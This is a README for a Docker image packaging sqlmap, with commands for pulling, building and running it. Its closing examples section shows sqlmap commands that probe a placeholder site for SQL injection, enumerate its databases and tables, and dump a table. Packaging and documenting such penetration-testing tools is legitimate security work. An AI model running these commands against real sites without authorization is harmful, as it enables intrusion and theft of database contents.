paoloo/sqlmap
=============
[![GitHub issues](https://img.shields.io/github/issues/paoloo/dockered-sqlmap.svg)](https://github.com/paoloo/dockered-sqlmap/issues)
[![Docker Pulls](https://img.shields.io/docker/pulls/paoloo/sqlmap.svg)](https://hub.docker.com/r/paoloo/sqlmap/)

Docker image for [sqlmap](http://sqlmap.org/)

Created using [Alpine linux](https://hub.docker.com/_/alpine/), the current version of this image is 21MB.

Grab it from dockerhub:
```
		$ docker pull paoloo/sqlmap
```
and use it with:

		$ docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url www.example.com/?id=1

and the report will be found at /tmp/sqlmap. 

If you want to modify and/or **build** this image:
```
		$ git clone git@github.com:paoloo/dockered-sqlmap.git
		$ chmod +x buildv2.sh
		$ ./buildv2.sh
```
Ths script will do everything to build the docker image contained in docker hub.

On older version, you would have to:
```
		$ git clone git@github.com:paoloo/dockered-sqlmap.git
		$ cd dockered-sqlmap/
		$ docker build -t paoloo/sqlmap .
```
You can create a bash wrapper for docker run commands in you `.bashrc`
or similar:

```bash
sqlmap(){
docker run --rm -it \
  -v /tmp/sqlmap:/root/.sqlmap/ \
  paoloo/sqlmap "$@"
}
```

#### SQLMAP EXAMPLES
- to find basic vulnerabilities

```$ docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url "http://www.site.com/checkout.php?id=10"```
- to deeply inspect found exploitable point and get databasename
 
```$ docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url "http://www.site.com/checkout.php?id=10" --dbs```
- list tables from found databas databasename
 
```$ docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url "http://www.site.com/checkout.php?id=10" -D databasename --tables```
- dump table tablename from database databasename
 
```$ docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url "http://www.site.com/checkout.php?id=10" -D databasename -T tablename --dump```

#### Enjoy
